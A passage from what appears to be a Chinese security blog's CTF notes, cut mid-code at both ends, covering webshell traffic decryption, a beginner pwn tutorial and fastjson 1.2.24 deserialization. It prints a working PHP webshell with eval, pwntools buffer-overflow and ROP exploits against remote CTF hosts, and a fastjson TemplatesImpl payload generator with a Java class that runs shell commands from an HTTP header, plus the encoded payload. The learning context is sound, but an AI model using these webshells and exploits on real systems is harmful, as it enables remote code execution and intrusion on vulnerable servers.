class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;babyshell&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;421eb7f1b8e4b3cf&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后利用脚本和key的值解密流量，脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encode($D,$K)&#123;</span><br><span class="line">    for($i=0;$i&lt;strlen($D);$i++)&#123;</span><br><span class="line">        $c = $K[$i+1&amp;15];</span><br><span class="line">        $D[$i] = $D[$i]^$c;</span><br><span class="line">    &#125;</span><br><span class="line">    return $D;</span><br><span class="line">&#125;</span><br><span class="line">$key=&#x27;421eb7f1b8e4b3cf&#x27;;</span><br><span class="line">// 原来的数据去掉前十六位和后十六位然后解密</span><br><span class="line">echo gzdecode(encode(base64_decode(&#x27;LbptYjdmMWI4ZoE2+A3FBCZs8s3/2PKxBId+Ti9TYqEws0G3+2AoASrxIHKj1YzjPb7Dr3sBAkH1g858newT2sfwTSDhfJY0IF2CdahBjZ16Kydte4fnA4ps5GEFQjcVGnE0IpcU4Fhy2PQplI6Bmid+UEeQ7+l+IkttmQi88ozihsYl7HKuKxPbiN675JjdBkAYucb3qvrEht15LKltihso4gQulwf693htj4qZ9gYgnBI85pO1fMHDmRl1mNzRiY/IycrkHviqK6VPyzM/xETbxrry6NaBDGyD07akCSc+LEKjrBLUDyo2qxnpgl7F8PFRZhdmQTMsHAeBuMetHgZUq9um/e+B1+xdz6PAJXMEMfd+u7KkZDQiAUZotEuccxGuqaIDnJa9ZqLolU9zKWsHsW4LBvhk6DQoYVmZrOZeFWgOTPS3cBO48txKi52SiSKiGz2lneeykFY8PY7x7YsejsgsCbH9I3VOsDnMCTbb2VnfH5yOkcMitb41pGnSWf6/RRkkqpeNwo7On43IxDXNSS7+ak65xLLQqaaYx0HN2KfjS5qBw7dn49advozy0wdX5UmfrZbc34YvQ5/D1LXfkLPMKbKd0TrFHNO3oGVQoxY95NwbdA9STRHvkF9PLOPHXoYH6L3m66WwEv2suIxm+qpGyr+5fw+NfXOo8u0/+H9LrQj72PZtkVuwY+aRriLNqw03AyEa3GDKmfJ9oGMEtkenLXdkMfGzNvp3P/+SdYzHGnrdFBArShsNJzAJPTwQvnhHsIIRBjBiMw==&#x27;),$key));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意要先去掉密文的前16位和后16位，比如密文为</p>
<p>8dddd282f7b5125bLbptYjdmMWI4Zv+tNWMh6e5IZ2I3Zg&#x3D;&#x3D;6b1ce45ad828e150</p>
<p>需要解密的内容为LbptYjdmMWI4Zv+tNWMh6e5IZ2I3Zg&#x3D;&#x3D;</p>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn入门</title>
    <url>/2024/04/05/pwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>二进制安全新手</p>
<span id="more"></span>

<p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p>
<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>CALL 指令：</p>
<p>CALL 指令用于调用一个子程序（或称为过程或函数）。它实现了一种跳转到其他代码块执行的机制，但与 JMP 不同，CALL 在执行跳转之前会将当前指令的下一条指令地址入栈，以便在子程序执行完毕后能够返回到调用点。这为程序的模块化和结构化提供了基础，使得代码更易于理解和维护。</p>
<p>RET 指令：</p>
<p>RET 指令与 CALL 相对应，用于从子程序中返回到调用点。它从栈中弹出之前保存的返回地址，将程序的控制流恢复到调用点，实现了子程序的返回操作。RET 的使用使得程序能够方便地从一个子程序切换回到主程序，完成所需的计算和任务。</p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
<p><strong>栈从高地址向低地址生长，ebp高地址，esp低地址，</strong></p>
<p>rbp 64 位寄存器 ebp 32 位寄存器</p>
<p>由此可见 main函数的返回地址在 rbp+8的地址上</p>
<p>bss段<br>bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。</p>
<p>bss是英文Block Started by Symbol的简称。</p>
<p>bss段属于静态内存分配。<br>比如</p>
<p>int a;</p>
<p>data段<br>数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。</p>
<p>数据段属于静态内存分配。<br>比如</p>
<p>int a&#x3D; 1<br>text段<br>代码段（code segment&#x2F;text segment）通常是指用来存放程序执行代码的一块内存区域。</p>
<p>这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。</p>
<p>在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p>
<p>heap<br>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。</p>
<p>当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；</p>
<p>当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p>
<p>stack<br>栈又称堆栈，是用户存放程序临时创建的局部变量，</p>
<p>也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。</p>
<p>除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。</p>
<p>由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存&#x2F;恢复调用现场。</p>
<p>从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</p>
<p>一般般来说，我们会有如下的覆盖需求</p>
<ul>
<li><p><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</p>
</li>
<li><p><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</p>
</li>
<li><p><strong>覆盖 bss 段某个变量的内容</strong>。</p>
</li>
<li><p>根据现实执行情况，覆盖特定的变量或地址的内容。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>jarvisoj_level0，可在buuctf网站中下载。首先使用checksec工具查看它开了啥保护措施，基本全关。</p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/1.jpg" alt="1.jpg"></p>
<p>然后我们使用ida查看一下该程序，程序很简单,有明显的栈溢出漏洞和后门函数，后门函数地址就为0x40059A。</p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/2.jpg" alt="2.jpg"></p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/3.jpg" alt="3.jpg"></p>
<p>ida帮我们计算出来了buf字符串距离rbp有0x80个字节，由于rbp本身还占8个字节，所以溢出0x88个字节后将返回地址修改为后门函数的地址exp如下。</p>
<p>手动打断点调试如下</p>
<p><img src="https://s2.loli.net/2024/04/07/W1R2hABJXKDn8fE.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./level0&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27644</span>)</span><br><span class="line">sys_addr = <span class="number">0x40059A</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="nx-保护"><a href="#nx-保护" class="headerlink" title="nx 保护"></a>nx 保护</h2><p>hahaha</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec ./hahaha</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/mILyK4DRT3tABPV.png"></p>
<p>程序为64位elf文件，开启NX保护。</p>
<p>仅仅64 位的文件需要，32位直接打</p>
<p>payload形式为：nop + p(rdi | ret) + p(system_addr) + p(bin_sh)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary hahaha</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/RlaXbiVpeLErJfn.png"></p>
<p>system_addr</p>
<p><img src="https://s2.loli.net/2024/04/23/NFL8Sm5P4vdZsM9.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;120.46.59.242&#x27;</span>,<span class="number">2103</span>)</span><br><span class="line">system_addr = <span class="number">0x400460</span></span><br><span class="line">pop_rdi = <span class="number">0x0400643</span></span><br><span class="line">bin_sh = <span class="number">0x0400664</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x30</span>+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span> * padding+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<p><a href="https://blog.csdn.net/weixin_39194641/article/details/101113761">https://blog.csdn.net/weixin_39194641/article/details/101113761</a>)</p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://blog.csdn.net/weixin_39194641/article/details/101113761">CTF中的PWN——绕NX防护1（本地libc 栈溢出）_ctf的pwn中nx为什么-CSDN博客</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上） - 知乎 (zhihu.com)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a>)</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowjava反序列化</title>
    <url>/2024/04/14/ctfshowjava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>ctfshow java 反序列化</p>
<span id="more"></span>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson1.2.4</title>
    <url>/2024/04/26/fastjson1-2-4/</url>
    <content><![CDATA[<p> fastjson 反序列化</p>
<span id="more"></span>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">       &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.1.6.RELEASE&lt;/version&gt;</span><br><span class="line">        &lt;relativePath&gt;&lt;/relativePath&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fast&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package ysoserial.fastjson;</span><br><span class="line">​</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">​</span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static String filetoBase64(String filename) throws IOException &#123;</span><br><span class="line">        File file = new File(filename);</span><br><span class="line">        FileInputStream io = new FileInputStream(file);</span><br><span class="line">        ByteArrayOutputStream os = new ByteArrayOutputStream();</span><br><span class="line">        byte[] buf = new byte[10240];</span><br><span class="line">        int len;</span><br><span class="line">        while ((len = io.read(buf)) &gt; 0) &#123;</span><br><span class="line">            os.write(buf, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        io.close();</span><br><span class="line">        String s = Base64.getEncoder().encodeToString(os.toByteArray());</span><br><span class="line">        return s;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">​</span><br><span class="line">        String shell = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            shell = filetoBase64(&quot;Shell.class&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        String payload1 = &quot; &#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+shell+&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;;</span><br><span class="line">        System.out.println(payload1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">package ysoserial.fastjson;</span><br><span class="line">​</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">​</span><br><span class="line">import java.io.IOException;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shell</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">Shell</span>() &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.<span class="title function_ invoke__">getRequestAttributes</span>();</span><br><span class="line">            javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).<span class="title function_ invoke__">getRequest</span>();</span><br><span class="line">            javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).<span class="title function_ invoke__">getResponse</span>();</span><br><span class="line">            String[] cmd =  <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httprequest.<span class="title function_ invoke__">getHeader</span>(<span class="string">&quot;Cmd&quot;</span>)&#125;;</span><br><span class="line">            byte[] result = <span class="keyword">new</span> java.util.<span class="title function_ invoke__">Scanner</span>(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).<span class="title function_ invoke__">start</span>().<span class="title function_ invoke__">getInputStream</span>()).<span class="title function_ invoke__">useDelimiter</span>(<span class="string">&quot;\\A&quot;</span>).<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">getBytes</span>();</span><br><span class="line">            httpresponse.<span class="title function_ invoke__">getWriter</span>().<span class="title function_ invoke__">write</span>(<span class="keyword">new</span> <span class="title class_">String</span>(result));</span><br><span class="line">            httpresponse.<span class="title function_ invoke__">getWriter</span>().<span class="title function_ invoke__">flush</span>();</span><br><span class="line">            httpresponse.<span class="title function_ invoke__">getWriter</span>().<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.<span class="title function_ invoke__">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">​</span><br><span class="line">    @Override</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">transform</span>(DOM document, SerializationHandler[] handlers) throws</span><br><span class="line">            TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">​</span><br><span class="line">    @Override</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">transform</span>(DOM document, DTMAxisIterator iterator,</span><br><span class="line">                          SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAhwoAHQBDCgBEAEUHAEYKAAMARwoAAwBIBwBJCABKCABLCABMCwBNAE4HAE8HAFAKAAwAUQoADABSCgBTAFQKAAsAVQgAVgoACwBXCgALAFgKAAYAWQsAWgBbCgAGAFwKAF0AXgoAXQBfCgBdAGAHAGEKABoAYgcAYwcAZAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBABFyZXF1ZXN0QXR0cmlidXRlcwEAO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQALaHR0cHJlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAxodHRwcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAAltCAQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEABHRoaXMBABpMeXNvc2VyaWFsL2Zhc3Rqc29uL1NoZWxsOwEADVN0YWNrTWFwVGFibGUHAGMHAGEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAZQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAClNoZWxsLmphdmEMAB4AHwcAZgwAZwBoAQBAb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1NlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwwAaQBqDABrAGwBABBqYXZhL2xhbmcvU3RyaW5nAQACc2gBAAItYwEAA0NtZAcAbQwAbgBvAQARamF2YS91dGlsL1NjYW5uZXIBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIMAB4AcAwAcQByBwBzDAB0AHUMAB4AdgEAAlxBDAB3AHgMAHkAegwAewB8BwB9DAB+AH8MAB4AgAcAgQwAggCDDACEAB8MAIUAHwEAE2phdmEvaW8vSU9FeGNlcHRpb24MAIYAHwEAGHlzb3NlcmlhbC9mYXN0anNvbi9TaGVsbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABRnZXRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGdldEJ5dGVzAQAEKClbQgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBAAUoW0IpVgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UBAA9wcmludFN0YWNrVHJhY2UAIQAcAB0AAAAAAAMAAQAeAB8AAQAgAAABNwAFAAYAAACDKrcAAbgAAkwrwAADtgAETSvAAAO2AAVOBr0ABlkDEgdTWQQSCFNZBSwSCbkACgIAUzoEuwALWbsADFkZBLcADbYADrYAD7cAEBIRtgAStgATtgAUOgUtuQAVAQC7AAZZGQW3ABa2ABctuQAVAQC2ABgtuQAVAQC2ABmnAAhMK7YAG7EAAQAEAHoAfQAaAAMAIQAAADYADQAAAAwABAAOAAgADwAQABAAGAARADMAEgBWABMAaAAUAHEAFQB6ABgAfQAWAH4AFwCCABkAIgAAAEgABwAIAHIAIwAkAAEAEABqACUAJgACABgAYgAnACgAAwAzAEcAKQAqAAQAVgAkACsALAAFA